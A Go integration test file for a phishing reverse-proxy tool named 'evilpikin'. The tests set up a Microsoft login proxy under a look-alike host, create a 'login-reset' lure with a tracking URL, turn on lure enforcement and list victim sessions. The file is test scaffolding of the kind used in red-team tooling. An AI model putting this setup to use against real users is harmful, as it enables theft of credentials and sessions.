package console

import (
	"path/filepath"
	"strings"
	"testing"

	"github.com/user/evilpikin/internal/proxy"
	"github.com/user/evilpikin/internal/storage"
	"github.com/user/evilpikin/internal/tui"
)

// TestTUIBackendIntegration ensures the TUI's Backend surface (RunLine + Status)
// drives the real console command tree without deadlocking or panicking.
func TestTUIBackendIntegration(t *testing.T) {
	db := filepath.Join(t.TempDir(), "t.db")
	store, err := storage.OpenSQLite(db)
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()

	caDir := t.TempDir()
	engine := proxy.NewEngine()
	if err := store.UpsertTarget(&storage.TargetProfile{
		ID: "ms-live", Name: "MS", ProxyHost: "ms.test", Origin: "login.microsoftonline.com", Enabled: true,
	}); err != nil {
		t.Fatal(err)
	}

	c, err := New(store, engine, Config{CACertPath: filepath.Join(caDir, "dev-ca.pem"), CAKeyPath: filepath.Join(caDir, "dev-ca.key")})
	if err != nil {
		t.Fatal(err)
	}
	c.Domain().SetDomain("evilpikin.com")
	c.Domain().SetIP("203.0.113.10")

	// The console must satisfy tui.Backend.
	var b tui.Backend = c

	out, err := tui.RunLine(b, "config show")
	if err != nil {
		t.Fatalf("config show failed: %v", err)
	}
	if !strings.Contains(out, "evilpikin.com") {
		t.Fatalf("config show output missing domain:\n%s", out)
	}
	if !strings.Contains(out, "203.0.113.10") {
		t.Fatalf("config show output missing IP:\n%s", out)
	}

	// Status() must surface domain + IP + DNS to the status bar.
	s := b.Status()
	if s.Domain != "evilpikin.com" {
		t.Fatalf("status domain = %q", s.Domain)
	}
	if s.IP != "203.0.113.10" {
		t.Fatalf("status ip = %q", s.IP)
	}
	if s.IPVersion != "IPv4" {
		t.Fatalf("status ip version = %q", s.IPVersion)
	}
}

// TestLureCommandsIntegration drives the lures TUI commands through the real
// console command tree: create a tracked lure, list it, toggle enforcement, and
// verify the live engine picks up the registry + RequireLure flag.
func TestLureCommandsIntegration(t *testing.T) {
	db := filepath.Join(t.TempDir(), "t.db")
	store, err := storage.OpenSQLite(db)
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()

	caDir := t.TempDir()
	engine := proxy.NewEngine()
	if err := store.UpsertTarget(&storage.TargetProfile{
		ID: "ms", Name: "MS", ProxyHost: "login.evilpikin.com", Origin: "login.microsoftonline.com", Enabled: true,
	}); err != nil {
		t.Fatal(err)
	}

	c, err := New(store, engine, Config{CACertPath: filepath.Join(caDir, "dev-ca.pem"), CAKeyPath: filepath.Join(caDir, "dev-ca.key")})
	if err != nil {
		t.Fatal(err)
	}
	c.Domain().SetDomain("evilpikin.com")

	out, err := tui.RunLine(c, "lure create --path login-reset --target ms")
	if err != nil {
		t.Fatalf("lure create failed: %v", err)
	}
	if !strings.Contains(out, "tracking url") || !strings.Contains(out, "?id=") {
		t.Fatalf("lure create did not emit a tracking url:\n%s", out)
	}

	out, _ = tui.RunLine(c, "lure list")
	if !strings.Contains(out, "login-reset") {
		t.Fatalf("lure list missing registered lure:\n%s", out)
	}

	out, _ = tui.RunLine(c, "lure require on")
	if !strings.Contains(out, "lure enforcement: true") {
		t.Fatalf("lure require on output unexpected:\n%s", out)
	}
	if !c.engine.RequireLure {
		t.Fatal("engine RequireLure flag was not set by the command")
	}
	if c.Lures == nil || len(c.Lures.List()) == 0 {
		t.Fatal("shared lure registry was not populated")
	}

	out, _ = tui.RunLine(c, "lure sessions")
	if !strings.Contains(out, "no active victim sessions") {
		t.Fatalf("lure sessions output unexpected:\n%s", out)
	}
}
